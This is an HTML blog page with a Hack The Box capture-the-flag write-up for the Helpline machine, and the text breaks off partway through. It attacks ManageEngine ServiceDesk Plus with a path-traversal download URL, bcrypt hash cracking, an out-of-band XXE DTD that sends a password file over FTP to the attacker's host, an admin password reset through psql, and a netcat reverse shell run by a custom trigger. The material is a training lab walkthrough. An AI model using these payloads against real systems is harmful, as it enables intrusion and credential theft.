<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Helpline - Hack The Box - hackcommander.io</title>
<meta name="description" content="I did Helpline the unintended way by gaining my initial shell access as NT AUTHORITY\SYSTEM and then working my way back to the root and user flags. Both flags were encrypted for two different users so even with a SYSTEM shell I couldn’t immediately read the files and had to find the user plaintext credentials first. The credentials for user Tolu were especially hard to find: they were hidden in Windows Event Log files and I had to use a Python module to parse those.">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="hackcommander.io">
<meta property="og:title" content="Helpline - Hack The Box">
<meta property="og:url" content="http://localhost:4000/htb-writeup-helpline/">


  <meta property="og:description" content="I did Helpline the unintended way by gaining my initial shell access as NT AUTHORITY\SYSTEM and then working my way back to the root and user flags. Both flags were encrypted for two different users so even with a SYSTEM shell I couldn’t immediately read the files and had to find the user plaintext credentials first. The credentials for user Tolu were especially hard to find: they were hidden in Windows Event Log files and I had to use a Python module to parse those.">



  <meta property="og:image" content="http://localhost:4000/assets/images/htb-writeup-helpline/helpline_logo.png">





  <meta property="article:published_time" content="2019-08-17T00:00:00+02:00">





  

  


<link rel="canonical" href="http://localhost:4000/htb-writeup-helpline/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "HackCommander",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
                
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/" >Home</a>
            </li><li class="masthead__menu-item">
              <a href="/year-archive/" >Posts</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categories</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Tags</a>
            </li><li class="masthead__menu-item">
              <a href="/about/" >About</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">Helpline - Hack The Box</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">HackCommander</h3>
    
    
      <p class="author__bio" itemprop="description">
        Pentester, Bug Bounty Hunter <br>and CTF Player
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
        </li>
      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://www.linkedin.com/in/iván-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
          </a>
        </li>
      

      

      

      

      

      
        <li>
          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Helpline - Hack The Box">
    <meta itemprop="description" content="I did Helpline the unintended way by gaining my initial shell access as NT AUTHORITY\SYSTEM and then working my way back to the root and user flags. Both flags were encrypted for two different users so even with a SYSTEM shell I couldn’t immediately read the files and had to find the user plaintext credentials first. The credentials for user Tolu were especially hard to find: they were hidden in Windows Event Log files and I had to use a Python module to parse those.">
    <meta itemprop="datePublished" content="August 17, 2019">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Helpline - Hack The Box
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2019-08-17T00:00:00+02:00">August 17, 2019 </time>&emsp;
          
          
        </p>
        <p><img src="/assets/images/htb-writeup-helpline/helpline_logo.png" alt="" /></p>

<p>I did Helpline the unintended way by gaining my initial shell access as NT AUTHORITY\SYSTEM and then working my way back to the root and user flags. Both flags were encrypted for two different users so even with a SYSTEM shell I couldn’t immediately read the files and had to find the user plaintext credentials first. The credentials for user Tolu were especially hard to find: they were hidden in Windows Event Log files and I had to use a Python module to parse those.</p>

<h2 id="summary">Summary</h2>

<ul>
  <li>ManageEngine ServiceDesk allows guest login and we can recover an excel sheet with “hidden” credentials</li>
  <li>There’s an LFI vunerability that let us download the SDP backup files which contains password hashes</li>
  <li>We’re able to crack 3 credentials from the database and we can log in to the SDP app with user zachary_33258</li>
  <li>Using an OOB XXE vulnerability we obtain the password audit file which contains 3 other credentials</li>
  <li>After logging in via WinRM with user alice we reset the SDP application admin account by changing the hash in the postgresql database</li>
  <li>Once logged in to SDP as admin, we create a custom trigger action which executes netcat to give us a shell as NT AUTHORITY\SYSTEM</li>
  <li>Both user and root are EFS encrypted and we can’t read them as SYSTEM</li>
  <li>Using meterpreter, we impersonate Leo’s token and get access to admin-pass.xml which contains the administrator credential in Powershell secure strings</li>
  <li>After obtaining the plaintext password, we use mimikatz to recover the master key and decrypt the root flag</li>
  <li>The user flag is encrypted with user Tolu’s credentials. We find those in the Windows log files are using python-evtx</li>
</ul>

<h3 id="portscan">Portscan</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># nmap -sC -sV -p- 10.10.10.132
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8080/tcp  open  http-proxy    -
</code></pre></div></div>

<h3 id="smb-initial-enumeration">SMB initial enumeration</h3>

<p>SMB is not initially accessible with null sessions or the guest account.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># smbmap -u test -H 10.10.10.132
[+] Finding open SMB ports....
[!] Authentication error occured
[!] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
[!] Authentication error on 10.10.10.132
</code></pre></div></div>

<h3 id="servicedesk-initial-enumeration">ServiceDesk: Initial enumeration</h3>

<p>The ManageEngine ServiceDesk Plus 9.3 application is running on port 8080.</p>

<p><img src="/assets/images/htb-writeup-helpline/sdp_login.png" alt="" /></p>

<p>The application has a guest account enabled by default and we can log in with <code class="language-plaintext highlighter-rouge">guest/guest</code>.</p>

<p><img src="/assets/images/htb-writeup-helpline/sdp_guest.png" alt="" /></p>

<p>The guest account has read-only access to the list of solutions.</p>

<p><img src="/assets/images/htb-writeup-helpline/sdp_solutions.png" alt="" /></p>

<p>One of the solution contains a password audit spreadsheet that we can download.</p>

<p><img src="/assets/images/htb-writeup-helpline/sdp_solutions_audit.png" alt="" /></p>

<p>The main sheet contains some statistics but nothing useful.</p>

<p><img src="/assets/images/htb-writeup-helpline/audit_spreadsheet1.png" alt="" /></p>

<p>I noticed that the number of sheets reported differs from the tabs shown.</p>

<p><img src="/assets/images/htb-writeup-helpline/audit_spreadsheet2.png" alt="" /></p>

<p>I unhid the sheet then was able to view the “hidden” data.</p>

<p><img src="/assets/images/htb-writeup-helpline/audit_spreadsheet3.png" alt="" /></p>

<p><img src="/assets/images/htb-writeup-helpline/audit_spreadsheet4.png" alt="" /></p>

<p>The spreadsheet contains a few passwords but none of them are working on the SDP application, SMB or WinRM.</p>

<p>There is an interesting note: <code class="language-plaintext highlighter-rouge">File containing details from subsequent audit saved to C:\Temp\Password Audit\it_logins.txt on HELPLINE</code></p>

<p>We’ll keep that file in mind for later when we find a way to read files outside of the application.</p>

<h3 id="servicedesk-getting-the-database-backup-using-an-lfi">ServiceDesk: Getting the database backup using an LFI</h3>

<p>I found a <a href="https://blog.netxp.fr/manageengine-deep-exploitation/">blog post</a> about the CVE-2017-11511 LFI vulnerability.</p>

<p>We can view files by using a relative path: <code class="language-plaintext highlighter-rouge">http://helpline:8080/fosagent/repl/download-file?basedir=4&amp;filepath=\..\..\..\..\..\..\file</code></p>

<p>I tried fetching <code class="language-plaintext highlighter-rouge">win.ini</code> and it didn’t work but noticed that the application is running on the E: drive. So that means we won’t be able to read that password audit file located on the C: drive.</p>

<p><img src="/assets/images/htb-writeup-helpline/lfi_part1.png" alt="" /></p>

<p>We don’t even need to be authenticated to use the LFI vulnerability. The next thing is to read <code class="language-plaintext highlighter-rouge">sdpbackup.log</code> to find out what is the last backup date:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># curl "http://helpline:8080/fosagent/repl/download-file?basedir=4&amp;filepath=\..\..\..\..\..\..\manageengine\servicedesk\bin\sdpbackup.log"

[...]
Zipfile created: E:\ManageEngine\ServiceDesk\bin\..\\backup\backup_postgres_9309_fullbackup_03_08_2019_09_04\backup_postgres_9309_fullbackup_03_08_2019_09_04_part_1.data
Zipfile created: E:\ManageEngine\ServiceDesk\bin\..\\backup\backup_postgres_9309_fullbackup_03_08_2019_09_04\backup_postgres_9309_fullbackup_03_08_2019_09_04_part_2.data
Backup Completed Successfully.#
#
</code></pre></div></div>

<p>So we have two backup files we will download:</p>
<ul>
  <li>backup_postgres_9309_fullbackup_03_08_2019_09_04\backup_postgres_9309_fullbackup_03_08_2019_09_04_part_1.data</li>
  <li>backup_postgres_9309_fullbackup_03_08_2019_09_04\backup_postgres_9309_fullbackup_03_08_2019_09_04_part_2.data</li>
</ul>

<p>Using the LFI again to download both files:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># wget "http://helpline:8080/fosagent/repl/download-file?basedir=4&amp;filepath=\..\..\..\..\..\..\manageengine\servicedesk\backup\backup_postgres_9309_fullbackup_03_08_2019_09_04\backup_postgres_9309_fullbackup_03_08_2019_09_04_part_1.data"
[...]
2019-03-24 23:34:27 (7.80 MB/s) - ‘download-file?basedir=4&amp;filepath=\\..\\..\\..\\..\\..\\..\\manageengine\\servicedesk\\backup\\backup_postgres_9309_fullbackup_03_08_2019_09_04\\backup_postgres_9309_fullbackup_03_08_2019_09_04_part_1.data’ saved [2889616]

# wget "http://helpline:8080/fosagent/repl/download-file?basedir=4&amp;filepath=\..\..\..\..\..\..\manageengine\servicedesk\backup\backup_postgres_9309_fullbackup_03_08_2019_09_04\backup_postgres_9309_fullbackup_03_08_2019_09_04_part_2.data
&gt; "
[...]
2019-03-24 23:35:01 (1.82 MB/s) - ‘download-file?basedir=4&amp;filepath=\\..\\..\\..\\..\\..\\..\\manageengine\\servicedesk\\backup\\backup_postgres_9309_fullbackup_03_08_2019_09_04\\backup_postgres_9309_fullbackup_03_08_2019_09_04_part_2.data%0A’ saved [14468]
</code></pre></div></div>

<p>Both are zipped files:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># file backup_postgres_9309_fullbackup_03_08_2019_09_04_part_1.data
backup_postgres_9309_fullbackup_03_08_2019_09_04_part_1.data: Zip archive data, at least v2.0 to extract
# file backup_postgres_9309_fullbackup_03_08_2019_09_04_part_2.data
backup_postgres_9309_fullbackup_03_08_2019_09_04_part_2.data: Zip archive data, at least v2.0 to extract
</code></pre></div></div>

<p>We’ll extract the files and see that we have a lot of different files, one for each table in the database:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/db# unzip backup_postgres_9309_fullbackup_03_08_2019_09_04_part_1.data
/db# unzip backup_postgres_9309_fullbackup_03_08_2019_09_04_part_2.data

/db# ls -l |more
total 10912
-rw-r--r--  1 root root     326 Mar  8 09:05 aaaaccadminprofile.sql
-rw-r--r--  1 root root       0 Mar  8 09:05 aaaaccbadloginstatus.sql
-rw-r--r--  1 root root       0 Mar  8 09:05 aaaaccoldpassword.sql
-rw-r--r--  1 root root       0 Mar  8 09:05 aaaaccountowner.sql
-rw-r--r--  1 root root     349 Mar  8 09:05 aaaaccount.sql
-rw-r--r--  1 root root     405 Mar  8 09:05 aaaaccountstatus.sql
-rw-r--r--  1 root root       0 Mar  8 09:05 aaaaccownerprofile.sql
-rw-r--r--  1 root root     147 Mar  8 09:05 aaaaccpassword.sql
-rw-r--r--  1 root root       0 Mar  8 09:05 aaaaccuserprofile.sql
[...]
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">aaalogin.sql</code> file contains a few login IDs and usernames, but the passwords are not there.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>INSERT INTO AaaLogin (login_id,user_id,name,domainname) VALUES
(1, 3, N'guest', N'-');
(2, 4, N'administrator', N'-');
(302, 302, N'luis_21465', N'-');
(303, 303, N'zachary_33258', N'-');
(601, 601, N'stephen', N'-');
(602, 602, N'fiona', N'-');
(603, 603, N'mary', N'-');
(604, 604, N'anne', N'-');
</code></pre></div></div>

<p>The bcrypt hashes for those accounts are in the <code class="language-plaintext highlighter-rouge">aaapassword.sql</code> file:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>INSERT INTO AaaPassword (password_id,password,algorithm,salt,passwdprofile_id,passwdrule_id,createdtime,factor) VALUES
(1, N'$2a$12$6VGARvoc/dRcRxOckr6WmucFnKFfxdbEMcJvQdJaS5beNK0ci0laG', N'bcrypt', N'$2a$12$6VGARvoc/dRcRxOckr6Wmu', 2, 1, 1545350288006, 12);
(302, N'$2a$12$2WVZ7E/MbRgTqdkWCOrJP.qWCHcsa37pnlK.0OyHKfd4lyDweMtki', N'bcrypt', N'$2a$12$2WVZ7E/MbRgTqdkWCOrJP.', 2, 1, 1545428506907, NULL);
(303, N'$2a$12$Em8etmNxTinGuub6rFdSwubakrWy9BEskUgq4uelRqAfAXIUpZrmm', N'bcrypt', N'$2a$12$Em8etmNxTinGuub6rFdSwu', 2, 1, 1545428808687, NULL);
(2, N'$2a$12$hmG6bvLokc9jNMYqoCpw2Op5ji7CWeBssq1xeCmU.ln/yh0OBPuDa', N'bcrypt', N'$2a$12$hmG6bvLokc9jNMYqoCpw2O', 2, 1, 1545428960671, 12);
(601, N'$2a$12$6sw6V2qSWANP.QxLarjHKOn3tntRUthhCrwt7NWleMIcIN24Clyyu', N'bcrypt', N'$2a$12$6sw6V2qSWANP.QxLarjHKO', 2, 1, 1545514864248, NULL);
(602, N'$2a$12$X2lV6Bm7MQomIunT5C651.PiqAq6IyATiYssprUbNgX3vJkxNCCDa', N'bcrypt', N'$2a$12$X2lV6Bm7MQomIunT5C651.', 2, 1, 1545515091170, NULL);
(603, N'$2a$12$gFZpYK8alTDXHPaFlK51XeBCxnvqSShZ5IO/T5GGliBGfAOxwHtHu', N'bcrypt', N'$2a$12$gFZpYK8alTDXHPaFlK51Xe', 2, 1, 1545516114589, NULL);
(604, N'$2a$12$4.iNcgnAd8Kyy7q/mgkTFuI14KDBEpMhY/RyzCE4TEMsvd.B9jHuy', N'bcrypt', N'$2a$12$4.iNcgnAd8Kyy7q/mgkTFu', 2, 1, 1545517215465, NULL);
</code></pre></div></div>

<p>To crack the hashes with hashcat, we only need to keep the first part so we end up with the following file that we feed to hashcat.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$2a$12$6VGARvoc/dRcRxOckr6WmucFnKFfxdbEMcJvQdJaS5beNK0ci0laG
$2a$12$2WVZ7E/MbRgTqdkWCOrJP.qWCHcsa37pnlK.0OyHKfd4lyDweMtki
$2a$12$Em8etmNxTinGuub6rFdSwubakrWy9BEskUgq4uelRqAfAXIUpZrmm
$2a$12$hmG6bvLokc9jNMYqoCpw2Op5ji7CWeBssq1xeCmU.ln/yh0OBPuDa
$2a$12$6sw6V2qSWANP.QxLarjHKOn3tntRUthhCrwt7NWleMIcIN24Clyyu
$2a$12$X2lV6Bm7MQomIunT5C651.PiqAq6IyATiYssprUbNgX3vJkxNCCDa
$2a$12$gFZpYK8alTDXHPaFlK51XeBCxnvqSShZ5IO/T5GGliBGfAOxwHtHu
$2a$12$4.iNcgnAd8Kyy7q/mgkTFuI14KDBEpMhY/RyzCE4TEMsvd.B9jHuy
</code></pre></div></div>

<p>The correct hash type is found on <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a>. We can now start our cracking session with the following command:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\bin\hashcat&gt;hashcat64 -a 0 -m 3200 hash.txt passwords\rockyou.txt
hashcat (v5.1.0) starting...

OpenCL Platform #1: NVIDIA Corporation
======================================
* Device #1: GeForce GTX 980, 1024/4096 MB allocatable, 16MCU

Dictionary cache hit:
* Filename..: passwords\rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$2a$12$gFZpYK8alTDXHPaFlK51XeBCxnvqSShZ5IO/T5GGliBGfAOxwHtHu:1234567890
$2a$12$Em8etmNxTinGuub6rFdSwubakrWy9BEskUgq4uelRqAfAXIUpZrmm:0987654321
$2a$12$X2lV6Bm7MQomIunT5C651.PiqAq6IyATiYssprUbNgX3vJkxNCCDa:1q2w3e4r
</code></pre></div></div>

<p>I was able to recover 3 passwords. Cross-referencing the login ID in the <code class="language-plaintext highlighter-rouge">aaapassword</code> table with the <code class="language-plaintext highlighter-rouge">aaalogin</code> information, we have the following credentials:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">zachary_33258 / 0987654321</code></li>
  <li><code class="language-plaintext highlighter-rouge">fiona / 1q2w3e4r</code></li>
  <li><code class="language-plaintext highlighter-rouge">mary / 1234567890</code></li>
</ul>

<h3 id="servicedesk-zachary-user">ServiceDesk: Zachary user</h3>

<p>The user <code class="language-plaintext highlighter-rouge">zachary_33258</code> has access to the scheduler.</p>

<p><img src="/assets/images/htb-writeup-helpline/sdp_zachary1.png" alt="" /></p>

<p>He can also generate an API key.</p>

<p><img src="/assets/images/htb-writeup-helpline/sdp_zachary2.png" alt="" /></p>

<h3 id="servicedesk-mary-user">ServiceDesk: Mary user</h3>

<p>Mary has two tickets in her queue, nothing interesting here.</p>

<p><img src="/assets/images/htb-writeup-helpline/sdp_mary.png" alt="" /></p>

<h3 id="servicedesk-fiona-user">ServiceDesk: Fiona user</h3>

<p>Fiona also has two tickets, the 2nd one has been resolved and we see some credentials there. We make note of those but they ultimately weren’t useful on this box.</p>

<p><img src="/assets/images/htb-writeup-helpline/sdp_fiona1.png" alt="" /></p>

<p><img src="/assets/images/htb-writeup-helpline/sdp_fiona2.png" alt="" /></p>

<h3 id="servicedesk-reading-the-password-audit-file-via-oob-xxe-extraction">ServiceDesk: Reading the password audit file via OOB XXE extraction</h3>

<p>The following <a href="https://labs.integrity.pt/advisories/cve-2017-9362/index.html">CVE-2017-9362</a> talks about an XXE vulnerability in the CMDB API. The cool thing is we don’t even need special privileges to use this API endpoint. Zachary has the ability to generate API keys but here I’m just using the <code class="language-plaintext highlighter-rouge">fiona</code> user and I’m not specifying any API key.</p>

<p>First, let’s check if we can use the API endpoint <code class="language-plaintext highlighter-rouge">/api/cmdb/ci/list</code>:</p>

<p><img src="/assets/images/htb-writeup-helpline/sdp_xxe1.png" alt="" /></p>

<p>Ok, that works. Next let’s try using the example in the blog post above. Unfortunately I got a permissions error when I used the payload from the blog post.</p>

<p><img src="/assets/images/htb-writeup-helpline/sdp_xxe2.png" alt="" /></p>

<p>I tried a remote DTD and even though I got an error message from the page I did see the HTTP request come in to my Kali box.</p>

<p><img src="/assets/images/htb-writeup-helpline/sdp_xxe3.png" alt="" /></p>

<p><img src="/assets/images/htb-writeup-helpline/sdp_xxe4.png" alt="" /></p>

<p>I then tried the following OOB extraction payload in my <code class="language-plaintext highlighter-rouge">xxe_file.dtd</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;!ENTITY % d SYSTEM "file:///c:/Temp/Password Audit/it_logins.txt"&gt;
&lt;!ENTITY % c "&lt;!ENTITY rrr SYSTEM 'ftp://10.10.14.23:2121/%d;'&gt;"&gt;
</code></pre></div></div>

<p>The server fetched the DTD from my machine then connected by FTP and sent the content of the password audit file.</p>

<p><img src="/assets/images/htb-writeup-helpline/sdp_xxe5.png" alt="" /></p>

<p>We now have the following additional credentials:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">alice</code> / <code class="language-plaintext highlighter-rouge">$sys4ops@megabank!</code></li>
  <li><code class="language-plaintext highlighter-rouge">mike_adm</code> / <code class="language-plaintext highlighter-rouge">Password1</code></li>
  <li><code class="language-plaintext highlighter-rouge">dr_acc</code> / <code class="language-plaintext highlighter-rouge">dr_acc</code></li>
</ul>

<h3 id="servicedesk-resetting-the-administrator-password-through-postgresql">ServiceDesk: Resetting the administrator password through Postgresql</h3>

<p>The <code class="language-plaintext highlighter-rouge">mike_adm</code> and <code class="language-plaintext highlighter-rouge">dr_acc</code> accounts don’t exist but <code class="language-plaintext highlighter-rouge">alice</code> does.</p>

<p>We can now see shares but we don’t have any access to them:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># smbmap -d HELPLINE -u alice -p \$sys4ops@megabank! -H 10.10.10.132
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.132...
[+] IP: 10.10.10.132:445	Name: helpline.htb
	Disk                                                  	Permissions
	----                                                  	-----------
	ADMIN$                                            	NO ACCESS
	C$                                                	NO ACCESS
	E$                                                	NO ACCESS
	Helpdesk_Stats                                    	NO ACCESS
	IPC$                                              	READ ONLY
</code></pre></div></div>

<p>The WinRM port is listening on this box but I prefer to use Powershell inside Windows to log in instead of the Ruby WinRM module. I have another Windows VM running that I route through my Kali VM so I don’t need to flip between two VPN connections. The traffic from the Windows VM is NATed to the IP of the tun0 interface on the Kali VM.</p>

<p><img src="/assets/images/htb-writeup-helpline/winrm_alice1.png" alt="" /></p>

<p>The shell we have is pretty locked down: AMSI is enabled, Constrained Language mode is enabled, and Applocker is configured.</p>

<p><img src="/assets/images/htb-writeup-helpline/winrm_alice2.png" alt="" /></p>

<p><img src="/assets/images/htb-writeup-helpline/winrm_alice3.png" alt="" /></p>

<p><img src="/assets/images/htb-writeup-helpline/winrm_alice4.png" alt="" /></p>

<p>We know that the SDP application uses Postgresql as the database backend and that the credentials to log in to the application are stored in the database. Since we have shell access, we can try to change the database entries from the <code class="language-plaintext highlighter-rouge">psql.exe</code> application. Fortunately, this application is not blocked by AppLocker.</p>

<p>As shown here, we can check the <code class="language-plaintext highlighter-rouge">aaapassword</code> table:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[10.10.10.132]: PS E:\ManageEngine\ServiceDesk\pgsql\bin&gt; .\psql.exe -U postgres -h 127.0.0.1 -p 65432 -d servicedesk -c "select * from aaapassword"
 password_id |                           password                           | algorithm |             salt              |
-------------+--------------------------------------------------------------+-----------+-------------------------------+
           1 | $2a$12$6VGARvoc/dRcRxOckr6WmucFnKFfxdbEMcJvQdJaS5beNK0ci0laG | bcrypt    | $2a$12$6VGARvoc/dRcRxOckr6Wmu |
         302 | $2a$12$2WVZ7E/MbRgTqdkWCOrJP.qWCHcsa37pnlK.0OyHKfd4lyDweMtki | bcrypt    | $2a$12$2WVZ7E/MbRgTqdkWCOrJP. |
         303 | $2a$12$Em8etmNxTinGuub6rFdSwubakrWy9BEskUgq4uelRqAfAXIUpZrmm | bcrypt    | $2a$12$Em8etmNxTinGuub6rFdSwu |
           2 | $2a$12$hmG6bvLokc9jNMYqoCpw2Op5ji7CWeBssq1xeCmU.ln/yh0OBPuDa | bcrypt    | $2a$12$hmG6bvLokc9jNMYqoCpw2O |
         601 | $2a$12$6sw6V2qSWANP.QxLarjHKOn3tntRUthhCrwt7NWleMIcIN24Clyyu | bcrypt    | $2a$12$6sw6V2qSWANP.QxLarjHKO |
         602 | $2a$12$X2lV6Bm7MQomIunT5C651.PiqAq6IyATiYssprUbNgX3vJkxNCCDa | bcrypt    | $2a$12$X2lV6Bm7MQomIunT5C651. |
         603 | $2a$12$gFZpYK8alTDXHPaFlK51XeBCxnvqSShZ5IO/T5GGliBGfAOxwHtHu | bcrypt    | $2a$12$gFZpYK8alTDXHPaFlK51Xe |
         604 | $2a$12$4.iNcgnAd8Kyy7q/mgkTFuI14KDBEpMhY/RyzCE4TEMsvd.B9jHuy | bcrypt    | $2a$12$4.iNcgnAd8Kyy7q/mgkTFu |
(8 rows)
</code></pre></div></div>

<p>The <a href="https://support.servicedeskplus.com/portal/kb/articles/how-to-reset-administrator-password-in-servicedesk-plus">documentation</a> contains the bcrypt hash that needs to be replaced in the table to reset the password to <code class="language-plaintext highlighter-rouge">admin</code>:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">password='$2a$12$fZUC9IK8E/AwtCxMKnCfiu830qUyYB/JRhWpi2k1vgWLC6iLFAgxa'</code></li>
  <li><code class="language-plaintext highlighter-rouge">salt='$2a$12$fZUC9IK8E/AwtCxMKnCfiu'</code></li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[10.10.10.132]: PS E:\ManageEngine\ServiceDesk\pgsql\bin&gt; .\psql.exe -U postgres -h 127.0.0.1 -p 65432 -d servicedesk -c "update aaap
assword set password ='`$2a`$12`$fZUC9IK8E/AwtCxMKnCfiu830qUyYB/JRhWpi2k1vgWLC6iLFAgxa' where password_id=2"
UPDATE 1
[10.10.10.132]: PS E:\ManageEngine\ServiceDesk\pgsql\bin&gt; .\psql.exe -U postgres -h 127.0.0.1 -p 65432 -d servicedesk -c "update aaap
assword set salt ='`$2a`$12`$fZUC9IK8E/AwtCxMKnCfiu' where password_id=2"
UPDATE 1
</code></pre></div></div>

<p>We can now log in as <code class="language-plaintext highlighter-rouge">administrator</code> with the password <code class="language-plaintext highlighter-rouge">admin</code>. In the <code class="language-plaintext highlighter-rouge">Admin</code> tab, we’ll use the <em>Custom Triggers</em> menu to gain RCE.</p>

<p><img src="/assets/images/htb-writeup-helpline/sdp_admin1.png" alt="" /></p>

<h3 id="rce-and-a-nt-authoritysystem-reverse-shell">RCE and a NT AUTHORITY\SYSTEM reverse shell</h3>

<p>As Alice I downloaded netcat to the box even though I can’t execute <code class="language-plaintext highlighter-rouge">nc.exe</code> from Alice because of Bitlocker.</p>

<p><img src="/assets/images/htb-writeup-helpline/netcat.png" alt="" /></p>

<p>The I created a new Custom Trigger action in SDP that’ll execute <code class="language-plaintext highlighter-rouge">nc.exe</code> when a new Request is created with a subject of <code class="language-plaintext highlighter-rouge">pwn</code>.</p>

<p><img src="/assets/images/htb-writeup-helpline/sdp_admin3.png" alt="" /></p>

<p><img src="/assets/images/htb-writeup-helpline/sdp_admin4.png" alt="" /></p>

<p>After the request was created, I got a reverse shell as SYSTEM:</p>

<p><img src="/assets/images/htb-writeup-helpline/system_shell.png" alt="" /></p>

<h3 id="disabling-protections-and-grabbing-the-ntlm-hashes">Disabling protections and grabbing the NTLM hashes</h3>

<p>We can’t read <code class="language-plaintext highlighter-rouge">user.txt</code> or <code class="language-plaintext highlighter-rouge">root.txt</code> even if we’re SYSTEM because they’re both EFS encrypted. We’ll need the plaintext passwords for the account in order to recover the masterkey and decrypt those files.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\Administrator\Desktop&gt;type root.txt
Access is denied.

C:\Users\Administrator\Desktop&gt;cipher /c root.txt

 Listing C:\Users\Administrator\Desktop\
 New files added to this directory will not be encrypted.

E root.txt
